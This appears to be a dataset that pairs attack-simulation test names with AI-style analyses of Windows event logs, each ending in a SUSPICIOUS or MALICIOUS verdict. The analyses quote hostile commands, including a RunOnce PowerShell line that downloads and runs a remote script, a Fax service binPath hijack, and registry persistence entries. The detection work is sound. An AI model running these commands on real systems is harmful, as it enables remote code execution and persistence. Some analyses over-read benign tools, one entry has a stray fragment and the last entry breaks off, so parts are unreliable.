- **Event ID 4616**: Indicates a change in system time. The `svchost.exe` process is involved, which is a legitimate Windows process. The time adjustment seems to be a backward shift, which can be suspicious if done without legitimate reasons. However, since the process involved is `svchost.exe` running under `LOCAL SERVICE`, and no additional signs of tampering or unauthorized actions are connected to this, it might be related to a legitimate synchronization or correction.

### Application Log
- **Edge Update Service Stopped**: Multiple entries showing that the `edgeupdate` service has stopped. The stopping of services can be part of normal operations like updates or system maintenance. These entries alone don't indicate malicious activity.

### Sysmon Log
- **Execution of Utilities and Commands**:
  - **whoami.exe and hostname.exe**: These utilities display logged-on user information and the computer's hostname, respectively. Execution is tied to a high-integrity session with the user `admin_test`. They appear to be executed in scripts or tasks for informational purposes.
  - **cmd.exe & reg.exe**: The command line reveals a registry modification aiming to add an entry to `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx`, which is used to execute commands once during login. It mentions a DLL file, which could be malicious unless verified as legitimate software. This is a significant indicator of potentially unauthorized persistence mechanisms or malware installation attempts.
  
- **Edge Update Processes**: Numerous executions and registrations of `MicrosoftEdgeUpdate.exe` and related executables are logged. While the high frequency of update processes might seem abnormal, the logs show operations with legitimate paths and proper users, aligning with automated update mechanisms. However, if the environment's policy requires reviews of software updates, these actions might merit further auditing.

### System Log
- **Time Change Events**: Further corroborates minor backward time adjustments. The legitimate service `svchost.exe` is involved, and there's no direct evidence suggesting malicious intent.

### Conclusion
The logs largely consist of normal operations, except for certain entries in the Sysmon and Security logs that warrant closer inspection, particularly the modification attempt of the registry via `cmd.exe` and `reg.exe`. This could be an indicator of an attempt to establish persistence, a common technique in malware operations.

### Resolution
- **SUSPICIOUS**: The registry modification attempt combined with other logs suggests potential unauthorized activity that necessitates further investigation. 

### Recommended Actions
1. **Investigate Registry Access**: Verify if the registry entry creation is authorized and if the DLL path is legitimate.
2. **Monitor and Correlate**: Check for any correlating events or unusual activities around the same times as the registry modification attempts.
3. **Check System Integrity**: Run system scans with updated antivirus/anti-malware tools to ensure the system's integrity.
4. **Audit User Activities**: Review the activities of the `admin_test` user for any anomalous behavior or logins from unusual locations.
5. **Review Update Policies**: Ensure that the high frequency of Edge update-related entries corresponds with your organization’s update policies.

Further analysis or environmental context might provide clear evidence of benign or malicious intent."
EXO - Full access mailbox permission granted to a user,"Upon analyzing the Windows event logs provided, here is a detailed breakdown along with the assessment:

### Analysis:

1. **PowerShell Log Events:**
   - There is a series of PowerShell script executions that involve the use of `Import-Module ExchangeOnlineManagement`, converting a string to a secure string with `$secure_pwd = ""o365_password_test"" | ConvertTo-SecureString -AsPlainText -Force`, and using credentials to perform operations in Exchange Online. Operations include:
     - `Connect-ExchangeOnline` with specific credentials.
     - `Add-MailboxPermission` to provide another user full access to a mailbox.
     - `Disconnect-ExchangeOnline`.
   - This sequence is performed by `powershell.exe` on `Server002`.

2. **Sysmon Log Events:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed under the `SERVER002\admin_test` user context, showing typical Windows system activity as `wevtutil.exe` is used to query and manage event logs.
   - A `hostname.exe` process is successfully launched, which is a benign system command to display the machine's hostname.
   - Similar behavior with `whoami.exe` is noted, which is used to obtain user information currently logged into the system.

### Suspicious/Anomalous Activity:

- **PowerShell Script Content**: 
  - The PowerShell script functionality itself is not inherently malicious. It executes an administrative task that involves granting full access to a mailbox. The unusual aspect could be the use of a hard-coded password in the script.
  - This action could raise suspicion if the involved accounts are not expected or provisioned to execute such tasks.

- **Use of Privileged User**: 
  - The operations are conducted with an administrative user context (`admin_test`). Any unexpected or unauthorized usage of `admin_test` could be a point of concern and might require verification.

### Assessment:

Given the provided logs, the key factors of suspicion are the PowerShell script actions, especially the mailbox permission modification using a plain text credential transformation. Here’s the final resolution based on the findings:

- **Resolution: SUSPICIOUS**

### Recommendations:

1. **Immediate Follow-Up:**
   - Verify the legitimacy of the `ExchangeOnlineManagement` operations. Confirm whether they were authorized and necessary.
   - Validate the access permissions that were added to ensure policy compliance and security.

2. **Credential Handling:**
   - Avoid using hard-coded credentials in scripts and logs to prevent data leaks. Consider implementing secure storage solutions, such as Windows Credential Manager or Azure Key Vault.

3. **User Context Review:**
   - Review the actions performed under the `admin_test` account, particularly around the time of the detected events, to ensure they align with expected behavior.

4. **Audit and Monitoring:**
   - Ensure logging and monitoring of PowerShell scripts and key administrative functions to detect unauthorized access or modifications. Consider implementing stricter SIEM rule sets and monitoring policies.

Conclusively, further investigation is required to determine the intent and authorization surrounding the activity observed in the logs."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"### Analysis of the Event Logs

Upon examining the provided event logs, several points stand out that require further analysis and context to assess the nature of the activities:

1. **Use of `wevtutil.exe` and `conhost.exe`:** 
   - We see frequent and consecutive execution of processes like `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The pattern of execution, along with the high frequency and closely spaced timestamps, may suggest automated tasks or scripts running. `wevtutil.exe` is used to query or export system event logs, while `conhost.exe` is a legitimate Windows process used to host command-line interfaces.

2. **PowerShell Activity:**
   - There is a PowerShell instance (`powershell.exe`) running with a suspicious command: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\x64\\CreateProcessWithPipe.exe -program \""C:\\Windows\\System32\\werfault.exe\"" -debug""`
   - The presence of `CreateProcessWithPipe.exe` in the command being executed via PowerShell, especially from a temp directory, is indicative of potentially malicious administrative actions or attempts to execute or manipulate with elevated privileges or bypass protections. This needs further investigation as it might try to exploit or misuse Windows error reporting (`werfault.exe`) in an unconventional manner.

3. **Potential Time Manipulation:**
   - The `Kernel-General` and `Security` logs indicate an abrupt system time change event which can be a tactic used by adversaries to backdate logs or evade certain time-based detection rules.

4. **Use of `wsmprovhost.exe`:**
   - Several processes appear to have been spawned by `wsmprovhost.exe`, which is a Windows service that enables PowerShell remoting. This is a common target for lateral movement or exploitation if not properly secured.

5. **System and Security Logs:**
   - Logs mention the change in the system time which can be normal behavior but when combined with other factors such as unexpected PowerShell scripts running, indicates potential tampering.

### Assessment

Based on the logs, there is enough evidence to classify this behavior as **SUSPICIOUS** due to the following reasons:
- The execution of scripts from a temporary directory via PowerShell that includes a suspicious executable.
- Frequent use of event log querying tools (`wevtutil.exe`).
- Timestamps indicating possible time manipulation.

### Guidance on Proceeding

- **Immediate Investigation:** Investigate the purpose and content of the PowerShell script executed from the temp directory, specifically focusing on `CreateProcessWithPipe.exe`.
- **Validate `admin_test` User Actions:** Verify recent activities and ensure legitimacy or credentials have not been compromised.
- **Review Time Change Events:** Audit system time changes to ensure they align with legitimate administrative or system tasks.
- **Audit Related System Changes and Access:** Conduct a thorough audit on any changes to system configurations or users logged activity that inappropriately aligns with suspicious timestamps.
- **Consider Enhanced Monitoring:** Consider deploying additional monitoring and detection capabilities to detect unusual usage patterns or privilege escalations.

Final Resolution: **SUSPICIOUS** - Further investigation is needed to confirm or rule out malicious intent."
Service Installation CMD,"Upon reviewing the provided logs, I have identified some key details and behaviors that warrant further attention:

1. **Service Creation and Execution**:
   - A new service named `fileTestService_CMD` was created using `sc.exe` with the command argument to create a service with `fileService.exe` located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`.
   - The service is set to auto start and runs under the `LocalSystem` account, which provides high privileges.

2. **Command-Line Activity**:
   - The use of `cmd.exe` to execute the `sc.exe` command for creating and starting a service is suspicious, particularly when pointing to an executable residing in a temporary folder.
   - Temporary directories are commonly used by malware to stage executables.

3. **Sysmon Logs Correlating**:
   - There are numerous Sysmon logs indicating the sequential creation and execution of processes related to `sc.exe`, and its subsequent usage to alter service configurations which also indicate privileged operations without typical use case descriptions being provided.

4. **Execution of Unsigned and Non-Windows Executable**:
   - The file `fileService.exe`, as seen in these execution logs, lacks a detailed version, product, company, or file description data which is uncommon for legitimate executable services, especially those running with high permissions. 

5. **Behavior Analysis and Contextual Signs**:
   - The sequence of operations surrounding the service creation appears automated and includes events tightly bound within milliseconds, indicative of a script or potentially automated malicious task.
   - The surrounding activity characterizes a possible attacker performing lateral movement or leveraging privilege escalation tactics to sustain persistence on the server. 

**Conclusion**:
The observed activities provide strong indicators of unauthorized and potentially malicious actions:
- Creation of a service linked to an executable from a temporary folder.
- Execution of such processes with elevated privileges.
- Absence of other application or script purposes potentially indicating actions inconsistent with standard administrative or system maintenance tasks.

**Resolution**: **MALICIOUS**

**Recommendations**:
- Immediately review and terminate the `fileTestService_CMD` service.
- Investigate the origin and composition of `fileService.exe` to determine if it is part of known legitimate processes.
- Conduct a thorough audit of the system for other indicators of compromise, including unauthorized users, changes in system file integrity, and other suspicious network activity.
- Apply relevant security patches and conduct user account reviews to ensure no unauthorized access paths persist.
- Engage in security awareness to share knowledge of such threats among system administrators and relevant personnel."
Process Hollowing using PowerShell,"Upon analyzing the provided Windows event logs, I have identified some concerning activities that merit closer examination. Here's a detailed breakdown of the findings:

### Observations and Findings:

1. **Suspicious Privilege Escalation:**
   - The `Security` logs contain two events with `EventID` 4672 right after a logon (EventID 4624) by the user `admin_test` on `SERVER002`. This indicates the assignment of special privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others) during the logon session. While it could be valid, these privileges can be exploited for malicious purposes, such as accessing sensitive system components.

2. **Use of PowerShell with Potentially Malicious Intent:**
   - In the `Sysmon` and `Windows PowerShell` logs, there is evidence of a PowerShell script execution involving `Start-Hollow.ps1`. This script leverages process hollowing by attempting to launch `notepad.exe` and hollow it out with `cmd.exe`. Process hollowing is a known technique used by attackers to evade detection by injecting malicious code into a legitimate process.

3. **Execution of Windows Utilities:**
   - Frequent appearances of `wevtutil.exe` and `conhost.exe` in `Sysmon` logs suggest possible log manipulation or viewing activities. However, the consistent execution pattern after certain administrative activities might imply ordinary administrative tasking that needs correlation with expected operational activities.

4. **Integrity Levels and Network Activities:**
   - All executions appear under high integrity, which signifies the use of elevated privileges. The observed network activities involve NTLM authentication from an external workstation `DESKTOP-3HL5B2P`, which matches with the administrative task activities (Logon Type 3 indicates network connection).

### Assessment:

- **Malicious Activity Detected**: The evidence from PowerShell logs leveraging process hollowing through `.ps1` script execution suggests direct intent to employ a technique commonly used in malware propagation.
- **Potential Risks**: Possible credential theft, backdoor establishment through `cmd.exe` execution within a legitimate `notepad.exe` process, and other system manipulations due to high-level privileges granted.

### Recommended Actions:

1. **Immediate Isolation and Investigation**: Quarantine the affected host `SERVER002` to prevent further potential breaches across the network.
2. **Forensic Analysis**: Capture live memory and execute a full forensic investigation to determine the scope of compromise and associated IOCs (Indicators of Compromise).
3. **Audit Powershell Scripts and Usage**: Review executed PowerShell command history and block unapproved scripts entirely.
4. **Privilege Review and Restriction**: Review admin user privileges, adjust based on least privilege, and monitor for further abuse.

### Resolution: **MALICIOUS**

The logs contain clear signs of malicious activity, specifically through the use of PowerShell scripts employing a known attack technique. Immediate action is recommended to mitigate potential damage and counter any ongoing threats."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"Upon reviewing the provided logs from the Windows host, here is the detailed analysis:

1. **System Log**: 
   - The time change events (EventID 24) managed by the `svchost.exe` process appear legitimate and are typically associated with system time adjustments. There is nothing overtly suspicious in these entries that implies malicious behavior.

2. **Windows PowerShell Log**: 
   - The entries in the PowerShell log suggest the execution of a complex command via `powershell.exe`, which involves starting `werfault.exe` and subsequently invoking `RtlCreateUserThread.exe` from a temporary directory.
   - The use of PowerShell to invoke external executables, especially from user-specific temp directories, is a common method in attacks to execute payloads with user privileges. The specific command line involving `RtlCreateUserThread.exe` potentially indicates an attempt to create a new thread within a target process, which can be used for process injection—a known technique in malware deployment.

3. **Sysmon Log**: 
   - The frequent execution of system binaries like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the `admin_test` account within a very short time window is unusual. These tools can be used for legitimate purposes, but when seen repeatedly in a sequence, it can suggest attempts at enumeration and manipulation of event logs, perhaps to cover tracks.

4. **Security Log**: 
   - The presence of EventID 4672 indicating the use of special privileges (including `SeDebugPrivilege` and others) by the `admin_test` account reveals that this account has been used to perform high-privilege tasks.
   - EventID 4624 shows a successful logon using the NTLM authentication package, but there are no immediate indicators of this being an unusual or unsolicited logon.

**Assessment and Conclusion**:
- The PowerShell activity stands out as suspicious due to the invocation of `RtlCreateUserThread.exe`, often indicative of potential malicious activity or exploitation techniques.
- The sequence of using system utilities such as `wevtutil.exe` and `whoami.exe` by the `admin_test` account, especially with elevated privileges, raises red flags about possible reconnaissance or privilege escalation attempts.

**Resolution:**
- **SUSPICIOUS**: This activity requires further investigation to confirm whether `RtlCreateUserThread.exe` is legitimate or if it has been planted by an attacker. Investigate the origin of this executable and verify if the `admin_test` account activities align with expected behavior or if they indicate a compromised account or insider threat.

**Guidance:**
- Conduct a thorough examination of the system, focusing on the PowerShell activity logs and origin/path of executed files.
- Validate the integrity and source of `RtlCreateUserThread.exe`.
- Review account activities for the `admin_test` account, especially around the timeframes noted in logs.
- Consider capturing memory or analyzing current running processes for signs of injected code or unusual thread activity."
Portable Executable Injection,"The provided Windows event logs contain multiple entries from different log channels, including Security, Sysmon, Windows PowerShell, and Application logs. Upon analyzing these logs, several events suggest potentially malicious activities, particularly involving the execution of a suspicious file and activities indicative of evasive or unauthorized behaviors. 

### Detailed Analysis:

1. **Security Log Events:**
   - Event ID 4672 shows the user `admin_test` being granted special privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, which are sensitive and often targeted by malicious activities for privilege escalation. 
   - Repeated Logon and Special Privilege events for `admin_test`, especially using NTLM from a workstation `DESKTOP-3HL5B2P`, raises concerns about unauthorized remote access.

2. **Windows PowerShell Log:**
   - The logs capture several instances of PowerShell execution (`EventID 600`), which contains suspicious command lines attempting to start a process, `RedInjection.exe`, from a temporary folder path. PowerShell is often used for malicious script execution, and the file path and naming convention resemble possible malicious intent or malware.
   - The powershell command includes instructions to execute `RedInjection.exe`, wait for a period, and kill Notepad processes. This behavior is not normal for typical administrative tasks and suggests evasive or malicious behavior.

3. **Sysmon Log Events:**
   - Recorded a process creation for `RedInjection.exe` (`EventID 1`), which matches the suspicious PowerShell execution. The lack of a file version, product name, and company increases suspicion of this being a malicious executable.
   - Several entries of executing typical system binaries (e.g., `wevtutil.exe`, `whoami.exe`) and the presence of `RedInjection.exe` as a parent process indicates potential file tampering or reconnaissance activity.
   
4. **Microsoft Edge Updates:**
   - Multiple processes related to Microsoft Edge updates (e.g., `MicrosoftEdgeUpdate.exe` and `Setup.exe`) were observed. These processes seem to be legitimate system updates as they are run by `NT AUTHORITY\SYSTEM` and align with expected behaviors of the Edge installation process. However, they do not appear directly related to the primary suspicious activities observed.

### Conclusion:
Based on the analysis, the presence of a suspicious PowerShell script executing a potentially malicious binary (`RedInjection.exe`), privilege escalation activities, and repetitive access using NTLM authentication signal a high likelihood of compromise. The PowerShell script's characteristics and the Sysmon logs underscore a deliberate attempt to perform unauthorized or stealthy operations on the system.

### Resolution:
**MALICIOUS** - The activities observed are indicative of malicious behavior. Immediate investigation and remediation steps are required. These include isolating the affected system, conducting a forensic investigation on `RedInjection.exe`, reviewing user account activities (especially `admin_test`), and validating the integrity of system files and user accounts."
Domain Account and Group Manipulate,"Upon review of the provided event logs, several indicators suggest potentially malicious activity:

1. **Suspicious PowerShell Execution**: 
   - The logs show suspicious PowerShell activity involving the creation of a new Active Directory user with the intent of adding this user to the ""Domain Admins"" group. This behavior is not typical for routine operations, particularly given the use of randomly generated account names (e.g., `atr--$x$y$z`).

2. **Processes and Command Lines**:
   - The sequence of processes such as `wevtutil.exe` (a command-line utility that enables the management of event logs) executed repeatedly could suggest attempts to manipulate or clear logs to hide malicious activities.
   - The command lines associated with PowerShell indicate potential abuse for privilege escalation or persistence, especially when the user context is `SERVER002\\admin_test`.

3. **Unusual Account Activity**:
   - There's evidence of new user creation and group membership changes directed at elevating privileges, which aligns closely with common privilege escalation techniques within compromised environments.

4. **Indicators from Security Logs**:
   - Elevated privileges were acquired using `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and other sensitive permissions. This is noteworthy, as these are typically required for malicious actions such as credential dumping or service manipulation.

5. **Compatibility with Malicious Patterns**:
   - Creating new user accounts and adding them to high-privilege groups, especially with scripting, is a standard attacking method used in lateral movement and privilege escalation.

**Resolution**: MALICIOUS

Given these indicators and the overall pattern of behavior in the logs, there's a substantial basis to confirm malicious activity. Immediate steps should include:

- Conducting a comprehensive threat hunting investigation.
- Isolating the affected system(s) from the network to prevent further unauthorized actions.
- Reviewing all user account changes and privilege assignments within the impacted domain.
- Ensuring robust endpoint protection and continuous monitoring using EDR solutions to detect and mitigate further threats."
UUID custom process Injection,"### **Analysis of Windows Event Logs**

Upon reviewing the provided Windows event logs, particularly the Windows PowerShell, Sysmon, and Security logs, several indicators suggest potential malicious activity within the system. Below is a detailed analysis of these indicators:

#### **1. PowerShell Activity:**
- **Command Execution:**
  - The logs show the execution of a PowerShell command that starts a process located in a temporary directory:
    ```
    powershell.exe & {Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\uuid_injection.exe""
    Start-Sleep -Seconds 7
    Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}
    ```
  - Executing binaries from temporary directories is atypical and often associated with malicious activities. The use of `uuid_injection.exe` is particularly suspicious, as filenames with ""injection"" often indicate potential code injection attempts.

- **Suspicious Actions:**
  - The command execution includes forcefully stopping `Notepad` processes, which could be part of a malicious payload operation where user applications are being disrupted or terminated.

#### **2. Sysmon Activity:**
- **Process Creation:**
  - There was a creation of the suspicious process `uuid_injection.exe` under the `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\` path. The absence of a digital signature or Company Description further adds to its suspicious nature.
  - Following `uuid_injection.exe`, there are multiple instances of `conhost.exe` and `notepad.exe` being manipulated, which is concerning, especially considering the context of preceding PowerShell commands.

#### **3. Security Log Anomalies:**
- **Privileged Process Privileges:**
  - Multiple entries for Event IDs 4624 and 4672 indicate the granting of extensive privileges to processes, including `SeDebugPrivilege`, which allows a process to debug other processes. This could be used by malicious actors to inject code or escalate privileges.
  
- **Credential Access Attempts:**
  - Event ID 5379 shows several failed credential access attempts with return codes indicating unauthorized access. These attempts often signify attempts to extract or misuse credentials within a Windows environment.

- **Task Host Activity:**
  - Reference to `taskhostw.exe`, a Host Process for Windows Tasks, being repeatedly involved in credential queries (Event ID 4798) warrants further scrutiny because it could be a vector for executing malicious tasks.

### **Assessment**

Based on the evidence found in the logs:

- **Indicators of Compromise (IoCs):** The execution of `uuid_injection.exe`, forced termination of processes, use of elevated privileges, and unusual credential access attempts are strong IoCs suggesting malicious activity. 
- **Conclusion:** Given the above indicators, the logs suggest the presence of potentially malicious actions on the host, specifically involving code execution from unauthorized paths and potential credential access attempts.

### **Resolution: MALICIOUS**

To proceed, the following steps are recommended:
1. **Immediate Quarantine and Investigation:** Immediately isolate the affected system and conduct a thorough forensic analysis to identify the scope of the compromise.
2. **Network and Antivirus Scans:** Conduct network-wide scans and ensure all systems are updated with the latest security patches.
3. **Review and Harden Security Policies:** Evaluate and tighten security policies, particularly around PowerShell execution policies and privileged access controls.
4. **End-user Awareness:** Inform and train users about suspicious activities and safe practices to mitigate risk from similar threats in future."
Azure AD - adding service principal to Azure AD role,"Upon a thorough examination of the provided Windows event logs, several events stand out as potentially indicative of suspicious activity:

1. **PowerShell Execution:**
   - The Sysmon logs show multiple instances of `powershell.exe` being executed by the user `SERVER002\admin_test`. One instance includes a complex command involving manipulation of Azure Active Directory (`AzureAD`) and service principals (`Get-AzureADServicePrincipal`). The execution of PowerShell scripts in this manner can be indicative of privilege escalation or lateral movement techniques used by attackers.
   - The specific command involves using plain-text credentials, which is a significant security concern. The command attempts to connect to Azure AD, search for a service principal, and then attempts to assign it a role. This might suggest an attempt to set up persistent access or escalate privileges within Azure AD.

2. **Process Execution:**
   - Multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` are executed in quick succession. While these are legitimate Windows utilities, their execution pattern and close timestamps could suggest attempts to cover tracks or tamper with logs (`wevtutil.exe` is often used for such purposes).
   - The frequent execution of console host processes (`conhost.exe`) along with system utilities like `whoami.exe` and `hostname.exe` could indicate reconnaissance activity. These processes are often used by attackers to gather system information or manipulate terminal sessions.

3. **High Integrity Level:**
   - All of the suspicious commands and scripts are executed with a ""High"" Integrity Level, which suggests that the operations have elevated privileges. This aligns with potential account compromise or misuse of administrative credentials.

4. **System and Application Logs:**
   - The logs show that system updates were applied, which is typically routine; however, there are no specific indications of service or configuration changes that would immediately signify a breach.

Based on these observations:
- The use of administrative privileges to execute potentially dangerous PowerShell scripts with plain-text credentials.
- Activities that involve Azure AD service principal management.
- The coinciding execution of system utilities potentially to tamper with logs or perform reconnaissance.

**Resolution: SUSPICIOUS**

**Assessment and Guidance:**
- While the exact intent of these actions remains unclear without further context, the nature and context of the executed scripts and commands lend to an assessment of suspicious activity.
- Further investigation is justified. Focus should be on confirming whether these activities were authorized and originated from the expected user, `admin_test`.
- Review Azure AD logs for any changes during the timeframe and ensure that no unauthorized users have gained roles or access.
- Conduct a thorough review of user activity, especially for accounts with elevated privileges on this server.
- Consider implementing stricter PowerShell logging and monitoring for this environment.
- If not already in place, enforce and monitor changes using multi-factor authentication and better credential management practices."
Domain Password Policy Check: Only Two Character Classes,"Upon reviewing the provided logs, the following findings and analysis are noted:

### Analysis:

1. **PowerShell Activity:**
   - A PowerShell script executed with the intent to manage user credentials and potentially update Active Directory account passwords. The script checks for a credential file in the local app data path and attempts to update the password for the current user. There are error handling mechanisms for incorrect passwords and a prompt for reconfiguration if necessary.
   - The use of `$env:LOCALAPPDATA\\file\\$env:USERNAME.txt` to store credentials and password management could indicate credential harvesting or unauthorized attempts to change user accounts. This behavior could be part of a legitimate administrative script, but it could also be leveraged maliciously to alter user accounts or gain unauthorized access.

2. **Sysmon Logs:**
   - Sysmon logs indicate multiple legitimate system processes such as `wevtutil.exe`, `conhost.exe`, and `powershell.exe` were executed. The presence of `ProcessCreate` events involving PowerShell and associated with the same user, `SERVER002\\admin_test`, suggests administrative-level activity during that session. 
   - The creation of `conhost.exe` processes often lines up with command-line interface activities, which by themselves are not inherently suspicious without additional context.

3. **Security Logs:**
   - Several `Logon` and `Special Logon` events (IDs 4624, 4672) occurred with the `SYSTEM` and `NT AUTHORITY` accounts, which are typical and expected but also provide an avenue for privilege escalation if misused.
   - A frequent use of the `taskhostw.exe` service without specific suspicious command lines suggests routine Windows Task Scheduler activities. However, this process could be abused if malicious scripts are scheduled for execution.
   - Several event ID 4798 activities querying user details could suggest account reconnaissance activity, which might indicate a preparatory step for more intrusive operations.

4. **Anomalous or Malicious Indicators:**
   - The combination of PowerShell activities intended to manage user credentials and repetitive querying of account details is anomalous. Such activities, especially if not justified by administrative policies, are potential indicators of compromise, deserving further investigation.

### Conclusion and Recommendation:

**Resolution: SUSPICIOUS**

- **Threat/Risk**: The combination of credential management through PowerShell and account enumeration indicates suspicious behavior that could point to attempted unauthorized access or insider threat.
- **Guidance**: 
  - Conduct deeper forensic analysis on the PowerShell scripts executed, verifying their origin and legitimacy.
  - Review logs for any evidence of modifications to user accounts, particularly high-value accounts.
  - Confirm the purpose and validation of the scripts managing user credentials with relevant system administrators.
  - Monitor the `SERVER002\\admin_test` user activities for any unusual behavior continually.
  - Validate with the IT team if these activities align with known administrative tasks or if further investigation into possible abuse is warranted."
PowerShell Registry RunOnce,"### Detailed Analysis of the Windows Event Logs

The provided logs from the Windows host display potential indicators of unusual and possibly malicious activities. Here is the analysis of significant findings.

1. **Security Log Events:**
   - **Event ID: 4624 (Logon Event)** and **Event ID: 4672 (Special Privileges):**
     - These events indicate a user `admin_test` logged in via a network logon (LogonType 3) and was granted an extensive list of special privileges, including `SeDebugPrivilege` which could be used for process and kernel debugging, often used in attacks.
   
2. **Sysmon Log Events:**
   - **Process Creation Events:**
     - Several instances of `whoami.exe` and `conhost.exe` were spawned, which in isolation may seem benign but can be suspicious if they are part of illicit lateral movement or reconnaissance activities.
     - More concerning is the execution of `powershell.exe` with a command line intended to download and execute a script from a remote source:   
       - `""powershell.exe"" & {$RunOnceKey = \""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"", set-itemproperty $RunOnceKey \""NextRun\"" 'powershell.exe \""IEX (New-Object Net.WebClient).DownloadString(`\""https://github.com/.../Discovery.bat`\"")\""'}`.
     - This indicates an attempt to perform script-based attack through PowerShell, known for being exploited in executing code from remote locations.
   
3. **PowerShell Log Events:**
   - PowerShell logs show the execution of a command intended to download and execute content from an external source. This is commonly a part of script-based attacks where attackers use PowerShell to bypass traditional security tools.

4. **Application and System Logs:**
   - The logs do not show unusual behavior apart from expected service activities regarding Microsoft Edge updates.

### Assessment

- **Suspicious Indicators:**
  - Privileges associated with `admin_test` are indicative of potential misuse.
  - The execution of `powershell.exe` with download and execution scripts from an external site indicates malicious behavior.

- **Potential Malicious Activity:**
  - The command line used in PowerShell is a typical technique for fetching and executing malicious scripts, possibly indicating a script-based attack or an initial foothold tactic often seen in targeted attacks.

   - Regularly update the host defense systems to recognize known attack patterns.
   - Monitor logs for known indicators of compromise and unusual patterns. 

This proactive approach will help in mitigating ongoing threats and preventing future occurrences."
Modify BootExecute Value,"Based on the analysis of the provided Windows event logs, I've identified the following points that could indicate suspicious behavior:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs show execution of commands that interact with the Windows Registry. The script is exporting a registry key (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`) to a temporary directory and modifying the `BootExecute` registry value.
   - Although the registry export and modification aren't uncommon, the context of where and when these changes occur (in a temp directory and by a user/admin named `admin_test`) could be indicative of initial setup for persistence or tampering by an unauthorized process.
   - The idea of modifying boot configurations in the registry without clear documentation or operational need can be suspicious, as it is often used for persistence by malware.

2. **Sysmon Logs:**
   - There are several entries reflecting the execution of administrative tools like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` by `admin_test`. These could be indications of system enumeration or reconnaissance activities, typically conducted during attack phases.
   - The execution of Microsoft Edge Update processes in `C:\Program Files (x86)\Microsoft\Temp\` and unusual folders (like `EU7AA4.tmp`) seems legitimate, as these are common paths and processes related to automatic updates. No unexpected parent-child process relations or unauthorized executions were observed here.

3. **Security Logs:**
   - Time synchronization (Event ID 4616) with NTP servers is expected on Windows systems and does not suggest anything malicious on its own.

4. **Other Logs:**
   - The Kernel and Application logs do not provide any additional indicators of compromise.
   - The Edge update service logs indicate regular update activity.

### Assessment and Conclusion:

Considering the above points, the behavior observed in the logs could potentially be typical system or admin activity, depending on the context and authorization of the `admin_test` account. However, the registry modifications via PowerShell, especially if unexpected or undocumented, can be concerning. Without prior context on whether these modifications were authorized or part of regular maintenance, it remains suspicious.

### Final Resolution:

- **SUSPICIOUS:** The PowerShell activities suggest behavior that merits further investigation, especially regarding the legitimacy of the `admin_test` account's actions and whether the modifications are part of expected system maintenance tasks. It is recommended to confirm if these actions align with known maintenance or administrative activity and ensure that there is proper authorization and logging of such registry changes. Further, a detailed examination of the associated scripts and any subsequent network or user activity should be conducted."
Modify Fax service to run PowerShell,"The provided event logs contain numerous entries, with many focusing on Microsoft Edge Update processes and system operations. Below is a detailed analysis highlighting suspicious or potentially malicious activities:

1. **Windows Event Logs Analysis:**

   - **`wevtutil.exe` Execution:** The repeated execution of `wevtutil.exe`, a command-line tool for managing event logs, could indicate an attempt to manipulate event logs. However, it may also be part of legitimate administrative activities due to its association with the user `SERVER002\admin_test`.

   - **Service Manipulation via `cmd.exe`:** One notable finding is the command-line execution of `cmd.exe` with service control commands:
     ```
     ""cmd.exe"" /c sc config Fax binPath= ""C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \""write-host 'data.003 Test'\"""" & sc start Fax
     ```
     This involves changing the service configuration of `Fax` to execute PowerShell with specific instructions, which is a well-known technique to execute arbitrary commands or scripts through a service. This behavior is particularly suspicious, indicating possible malicious intent to execute unauthorized PowerShell scripts.

   - **`whoami.exe` and `hostname.exe` Execution:** The execution of `whoami.exe` and `hostname.exe` seems benign as they are simple diagnostic tools to display current user and host information, respectively.

   - **PowerShell Execution:** The execution of PowerShell with a script command to output a test message can be part of a testing scenario by an administrator. However, given the suspicious service manipulation, it deserves further scrutiny.

   - **Microsoft Edge Update Processes:** Several entries with `MicrosoftEdgeUpdate.exe` and related files appear consistent with standard update operations for Microsoft Edge and do not showcase anomalies suggestive of malicious behavior.

2. **Security and System Logs:**
   - **Time Changes:** Security log entries showing time modifications (`EventID 4616`) usually follow synchronization with a network time source and appear consistent with normal system operation, given the presence of corresponding time service logs.
   - **Service Control Manager Entries:** Logs indicating attempts to start the modified Fax service are consistent with previous suspicious activity targeting this service.

3. **Threat Analysis:**
   - **Risk of Unauthorized Command Execution:** The manipulation of the Fax service to run PowerShell commands poses a critical security risk. It can be leveraged for privilege escalation or running further unauthorized scripts, potentially leading to deeper system compromise.

**Recommendation and Resolution:**
- **Resolution: MALICIOUS:** The evidence of service manipulation strongly suggests malicious intent. Immediate action is required to investigate and remediate any unauthorized access or changes.
- **Guidance:**
  - **Verify this manipulation:** Check service configurations, especially for Fax, and review for unauthorized changes.
  - **Investigate User Activity:** Analyze `SERVER002\admin_test`'s activities and credentials for potential compromise.
  - **System Audit:** Conduct a thorough system audit for any other unauthorized changes, ensuring security patches and relevant controls are up-to-date.
  - **Isolate and Monitor:** Isolate the affected system and conduct continuous monitoring for any further suspicious activity."
Remote Process Injection with Go using CreateRemoteThread WinAPI (Natively),"To analyze the provided logs for indicators of malicious activity, let's break down key elements from each log category:

### Windows PowerShell Logs

- **Observed Behavior**: In the PowerShell logs, there's a regular execution of a command involving `powershell.exe`, spawning processes using `Start-Process`. The command executed is:
  ```
